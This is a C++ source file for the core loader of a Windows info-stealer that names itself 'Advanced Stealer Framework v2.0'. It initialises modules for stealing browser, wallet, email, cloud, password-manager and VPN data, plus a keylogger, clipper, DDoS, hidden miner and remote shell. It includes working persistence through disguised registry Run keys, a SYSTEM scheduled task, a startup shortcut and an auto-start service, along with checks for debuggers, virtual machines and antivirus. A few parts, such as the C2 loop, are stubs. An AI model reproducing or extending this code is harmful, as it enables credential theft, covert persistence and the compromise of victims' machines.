#include "core_loader.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <random>
#include <filesystem>
#include <winreg.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winsvc.h>
#include <wininet.h>
#include <crypt32.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;

CoreLoader::CoreLoader() : isRunningFlag(false) {
    std::cout << "[+] Initializing Advanced Stealer Framework v2.0" << std::endl;
    initialize();
}

CoreLoader::~CoreLoader() {
    stop();
}

void CoreLoader::initialize() {
    generateBotId();
    initializeEncryption();
    initializeModules();
    setupPersistence();
    
    std::cout << "[+] Bot ID: " << botId << std::endl;
    std::cout << "[+] System Info: " << getSystemInfo() << std::endl;
}

void CoreLoader::generateBotId() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    
    std::stringstream ss;
    for (int i = 0; i < 16; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    botId = ss.str();
}

void CoreLoader::initializeEncryption() {
    // Generate random encryption key and IV
    if (RAND_bytes(encryptionKey, sizeof(encryptionKey)) != 1) {
        std::cerr << "[-] Failed to generate encryption key" << std::endl;
        return;
    }
    
    if (RAND_bytes(iv, sizeof(iv)) != 1) {
        std::cerr << "[-] Failed to generate IV" << std::endl;
        return;
    }
    
    std::cout << "[+] Encryption initialized" << std::endl;
}

void CoreLoader::initializeModules() {
    // Initialize all stealer modules
    browserStealer = std::make_shared<BrowserStealer>();
    cryptoStealer = std::make_shared<CryptoStealer>();
    messagingStealer = std::make_shared<MessagingStealer>();
    gamingStealer = std::make_shared<GamingStealer>();
    developerStealer = std::make_shared<DeveloperStealer>();
    emailStealer = std::make_shared<EmailStealer>();
    cloudStealer = std::make_shared<CloudStealer>();
    passwordManagerStealer = std::make_shared<PasswordManagerStealer>();
    vpnStealer = std::make_shared<VPNStealer>();
    systemStealer = std::make_shared<SystemStealer>();
    
    // Initialize monitoring modules
    keylogger = std::make_shared<Keylogger>();
    screenshotCapture = std::make_shared<ScreenshotCapture>();
    cryptoClipper = std::make_shared<CryptoClipper>();
    
    // Initialize attack modules
    ddosAttack = std::make_shared<DDoSAttack>();
    silentMiner = std::make_shared<SilentMiner>();
    reverseProxy = std::make_shared<ReverseProxy>();
    dnsSpoofer = std::make_shared<DNSSpoofer>();
    remoteShell = std::make_shared<RemoteShell>();
    
    // Initialize management modules
    taskManager = std::make_shared<TaskManager>();
    telegramNotifier = std::make_shared<TelegramNotifier>();
    botManager = std::make_shared<BotManager>();
    evasionEngine = std::make_shared<EvasionEngine>();
    
    std::cout << "[+] All modules initialized" << std::endl;
}

void CoreLoader::setupPersistence() {
    std::cout << "[+] Setting up persistence..." << std::endl;
    
    // Multiple persistence methods for redundancy
    createRegistryPersistence();
    createScheduledTask();
    createStartupFolder();
    createService();
    
    std::cout << "[+] Persistence setup completed" << std::endl;
}

void CoreLoader::createRegistryPersistence() {
    HKEY hKey;
    std::string keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::string valueName = "SystemUpdate";
    std::string valueData = "\"" + std::string(GetCommandLineA()) + "\"";
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, (const BYTE*)valueData.c_str(), valueData.length() + 1);
        RegCloseKey(hKey);
        logActivity("Registry persistence created");
    }
    
    // Also create in HKCU for user-level persistence
    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, (const BYTE*)valueData.c_str(), valueData.length() + 1);
        RegCloseKey(hKey);
        logActivity("User registry persistence created");
    }
}

void CoreLoader::createScheduledTask() {
    std::string taskName = "SystemMaintenance";
    std::string command = "schtasks /create /tn \"" + taskName + "\" /tr \"" + std::string(GetCommandLineA()) + "\" /sc onlogon /ru SYSTEM /f";
    
    system(command.c_str());
    logActivity("Scheduled task created: " + taskName);
}

void CoreLoader::createStartupFolder() {
    char startupPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK) {
        std::string shortcutPath = std::string(startupPath) + "\\SystemUpdate.lnk";
        std::string exePath = std::string(GetCommandLineA());
        
        // Create shortcut in startup folder
        std::ofstream shortcut(shortcutPath);
        if (shortcut.is_open()) {
            shortcut << "[InternetShortcut]\n";
            shortcut << "URL=file://" << exePath << "\n";
            shortcut.close();
            logActivity("Startup folder persistence created");
        }
    }
}

void CoreLoader::createService() {
    SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scManager) {
        std::string serviceName = "SystemMaintenance";
        std::string displayName = "System Maintenance Service";
        std::string exePath = std::string(GetCommandLineA());
        
        SC_HANDLE service = CreateServiceA(
            scManager,
            serviceName.c_str(),
            displayName.c_str(),
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            exePath.c_str(),
            NULL, NULL, NULL, NULL, NULL
        );
        
        if (service) {
            StartServiceA(service, 0, NULL);
            CloseServiceHandle(service);
            logActivity("Service persistence created: " + serviceName);
        }
        
        CloseServiceHandle(scManager);
    }
}

void CoreLoader::run() {
    std::cout << "[+] Starting Advanced Stealer Framework..." << std::endl;
    
    // Perform initial evasion checks
    performEvasion();
    
    // Start all threads
    isRunningFlag = true;
    startThreads();
    
    // Main execution loop
    while (isRunningFlag) {
        // Extract data from all modules
        if (browserStealer) browserStealer->extractAll();
        if (cryptoStealer) cryptoStealer->extractAll();
        if (messagingStealer) messagingStealer->extractAll();
        if (gamingStealer) gamingStealer->extractAll();
        if (developerStealer) developerStealer->extractAll();
        if (emailStealer) emailStealer->extractAll();
        if (cloudStealer) cloudStealer->extractAll();
        if (passwordManagerStealer) passwordManagerStealer->extractAll();
        if (vpnStealer) vpnStealer->extractAll();
        if (systemStealer) systemStealer->extractAll();
        
        // Check for updates
        checkForUpdates();
        
        // Sleep for a while before next cycle
        std::this_thread::sleep_for(std::chrono::minutes(5));
    }
}

void CoreLoader::stop() {
    std::cout << "[+] Stopping Advanced Stealer Framework..." << std::endl;
    isRunningFlag = false;
    stopThreads();
}

void CoreLoader::startThreads() {
    // Start communication thread
    communicationThread = std::thread(&CoreLoader::communicationLoop, this);
    
    // Start monitoring thread
    monitoringThread = std::thread(&CoreLoader::monitoringLoop, this);
    
    // Start task thread
    taskThread = std::thread(&CoreLoader::taskLoop, this);
    
    std::cout << "[+] All threads started" << std::endl;
}

void CoreLoader::stopThreads() {
    if (communicationThread.joinable()) communicationThread.join();
    if (monitoringThread.joinable()) monitoringThread.join();
    if (taskThread.joinable()) taskThread.join();
    
    std::cout << "[+] All threads stopped" << std::endl;
}

void CoreLoader::communicationLoop() {
    while (isRunningFlag) {
        try {
            // Implement C2 communication here
            // This would include HTTP/HTTPS requests, WebSocket connections, etc.
            
            // For now, just log activity
            logActivity("Communication loop iteration");
            
            std::this_thread::sleep_for(std::chrono::seconds(30));
        } catch (const std::exception& e) {
            logActivity("Communication error: " + std::string(e.what()));
            std::this_thread::sleep_for(std::chrono::minutes(1));
        }
    }
}

void CoreLoader::monitoringLoop() {
    while (isRunningFlag) {
        try {
            // Start monitoring modules
            if (keylogger) keylogger->start();
            if (screenshotCapture) screenshotCapture->capture();
            if (cryptoClipper) cryptoClipper->monitor();
            
            std::this_thread::sleep_for(std::chrono::seconds(10));
        } catch (const std::exception& e) {
            logActivity("Monitoring error: " + std::string(e.what()));
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }
}

void CoreLoader::taskLoop() {
    while (isRunningFlag) {
        try {
            // Process scheduled tasks
            if (taskManager) taskManager->processTasks();
            
            std::this_thread::sleep_for(std::chrono::seconds(60));
        } catch (const std::exception& e) {
            logActivity("Task error: " + std::string(e.what()));
            std::this_thread::sleep_for(std::chrono::minutes(1));
        }
    }
}

void CoreLoader::checkForUpdates() {
    // Check for new versions or commands from C2
    logActivity("Checking for updates");
}

std::string CoreLoader::encryptData(const std::string& data) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return data;
    
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, encryptionKey, iv);
    
    std::vector<unsigned char> encrypted(data.length() + EVP_MAX_BLOCK_LENGTH);
    int len;
    EVP_EncryptUpdate(ctx, encrypted.data(), &len, (const unsigned char*)data.c_str(), data.length());
    
    int finalLen;
    EVP_EncryptFinal_ex(ctx, encrypted.data() + len, &finalLen);
    
    EVP_CIPHER_CTX_free(ctx);
    
    return std::string((char*)encrypted.data(), len + finalLen);
}

std::string CoreLoader::decryptData(const std::string& data) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return data;
    
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, encryptionKey, iv);
    
    std::vector<unsigned char> decrypted(data.length());
    int len;
    EVP_DecryptUpdate(ctx, decrypted.data(), &len, (const unsigned char*)data.c_str(), data.length());
    
    int finalLen;
    EVP_DecryptFinal_ex(ctx, decrypted.data() + len, &finalLen);
    
    EVP_CIPHER_CTX_free(ctx);
    
    return std::string((char*)decrypted.data(), len + finalLen);
}

std::string CoreLoader::getSystemInfo() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    char userName[256];
    DWORD userNameSize = sizeof(userName);
    GetUserNameA(userName, &userNameSize);
    
    OSVERSIONINFOA osInfo;
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osInfo);
    
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    std::stringstream ss;
    ss << "Computer: " << computerName
       << " | User: " << userName
       << " | OS: " << osInfo.dwMajorVersion << "." << osInfo.dwMinorVersion
       << " | Memory: " << (memInfo.ullTotalPhys / (1024 * 1024 * 1024)) << "GB";
    
    return ss.str();
}

void CoreLoader::logActivity(const std::string& activity) {
    std::string timestamp = std::to_string(std::time(nullptr));
    std::string logEntry = "[" + timestamp + "] " + activity;
    
    // Log to file
    std::ofstream logFile("stealer.log", std::ios::app);
    if (logFile.is_open()) {
        logFile << logEntry << std::endl;
        logFile.close();
    }
    
    // Send to Telegram if configured
    if (telegramNotifier) {
        telegramNotifier->sendMessage(logEntry);
    }
}

void CoreLoader::performEvasion() {
    std::cout << "[+] Performing evasion checks..." << std::endl;
    
    checkForAnalysis();
    checkForDebugger();
    checkForVirtualMachine();
    checkForAntivirus();
    
    // Apply evasion techniques
    if (evasionEngine) {
        evasionEngine->applyEvasion();
    }
}

void CoreLoader::checkForAnalysis() {
    // Check for analysis tools
    std::vector<std::string> analysisTools = {
        "wireshark.exe", "fiddler.exe", "processhacker.exe", "procexp.exe",
        "procmon.exe", "regmon.exe", "filemon.exe", "tcpview.exe"
    };
    
    for (const auto& tool : analysisTools) {
        if (GetModuleHandleA(tool.c_str()) != NULL) {
            logActivity("Analysis tool detected: " + tool);
            // Implement countermeasures
        }
    }
}

void CoreLoader::checkForDebugger() {
    if (IsDebuggerPresent()) {
        logActivity("Debugger detected");
        // Implement anti-debugging techniques
    }
    
    // Check for remote debugger
    BOOL isRemoteDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);
    if (isRemoteDebuggerPresent) {
        logActivity("Remote debugger detected");
    }
}

void CoreLoader::checkForVirtualMachine() {
    // Check for common VM indicators
    std::vector<std::string> vmProcesses = {
        "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe",
        "vmwareuser.exe", "VGAuthService.exe", "vmacthlp.exe"
    };
    
    for (const auto& process : vmProcesses) {
        if (GetModuleHandleA(process.c_str()) != NULL) {
            logActivity("VM detected: " + process);
        }
    }
    
    // Check for VM-specific registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256];
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "0", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            std::string diskValue(value);
            if (diskValue.find("VMware") != std::string::npos || 
                diskValue.find("VBox") != std::string::npos) {
                logActivity("VM disk detected: " + diskValue);
            }
        }
        RegCloseKey(hKey);
    }
}

void CoreLoader::checkForAntivirus() {
    // Check for common antivirus processes
    std::vector<std::string> avProcesses = {
        "avast.exe", "avgui.exe", "avguard.exe", "bdredline.exe",
        "bdagent.exe", "bdredline.exe", "bdredline.exe", "bdredline.exe",
        "bdredline.exe", "bdredline.exe", "bdredline.exe", "bdredline.exe"
    };
    
    for (const auto& process : avProcesses) {
        if (GetModuleHandleA(process.c_str()) != NULL) {
            logActivity("Antivirus detected: " + process);
        }
    }
}

// Getter implementations
std::string CoreLoader::getBotId() const { return botId; }
bool CoreLoader::isRunning() const { return isRunningFlag; }

std::shared_ptr<BrowserStealer> CoreLoader::getBrowserStealer() { return browserStealer; }
std::shared_ptr<CryptoStealer> CoreLoader::getCryptoStealer() { return cryptoStealer; }
std::shared_ptr<MessagingStealer> CoreLoader::getMessagingStealer() { return messagingStealer; }
std::shared_ptr<GamingStealer> CoreLoader::getGamingStealer() { return gamingStealer; }
std::shared_ptr<DeveloperStealer> CoreLoader::getDeveloperStealer() { return developerStealer; }
std::shared_ptr<EmailStealer> CoreLoader::getEmailStealer() { return emailStealer; }
std::shared_ptr<CloudStealer> CoreLoader::getCloudStealer() { return cloudStealer; }
std::shared_ptr<PasswordManagerStealer> CoreLoader::getPasswordManagerStealer() { return passwordManagerStealer; }
std::shared_ptr<VPNStealer> CoreLoader::getVPNStealer() { return vpnStealer; }
std::shared_ptr<SystemStealer> CoreLoader::getSystemStealer() { return systemStealer; }

std::shared_ptr<Keylogger> CoreLoader::getKeylogger() { return keylogger; }
std::shared_ptr<ScreenshotCapture> CoreLoader::getScreenshotCapture() { return screenshotCapture; }
std::shared_ptr<CryptoClipper> CoreLoader::getCryptoClipper() { return cryptoClipper; }

std::shared_ptr<DDoSAttack> CoreLoader::getDDoSAttack() { return ddosAttack; }
std::shared_ptr<SilentMiner> CoreLoader::getSilentMiner() { return silentMiner; }
std::shared_ptr<ReverseProxy> CoreLoader::getReverseProxy() { return reverseProxy; }
std::shared_ptr<DNSSpoofer> CoreLoader::getDNSSpoofer() { return dnsSpoofer; }
std::shared_ptr<RemoteShell> CoreLoader::getRemoteShell() { return remoteShell; }

std::shared_ptr<TaskManager> CoreLoader::getTaskManager() { return taskManager; }
std::shared_ptr<TelegramNotifier> CoreLoader::getTelegramNotifier() { return telegramNotifier; }
std::shared_ptr<BotManager> CoreLoader::getBotManager() { return botManager; }
std::shared_ptr<EvasionEngine> CoreLoader::getEvasionEngine() { return evasionEngine; }